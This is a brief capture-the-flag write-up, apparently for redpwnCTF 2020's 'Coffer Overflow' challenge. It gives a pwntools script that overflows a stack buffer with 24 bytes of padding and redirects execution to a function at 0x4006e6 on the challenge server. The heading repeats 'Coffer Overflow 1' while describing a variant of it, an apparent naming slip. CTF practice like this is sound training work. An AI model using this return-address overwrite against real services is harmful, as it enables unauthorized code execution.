# Coffer Overflow 1
Pretty much exactly `Coffer Overflow 1`, except this time we have to return to a function at `0x4006e6`.

```python
from pwn import *

p = remote('2020.redpwnc.tf', 31908)

p.clean(0.2)

p.sendline(b'a' * 24 + p64(0x4006e6))
p.interactive()
```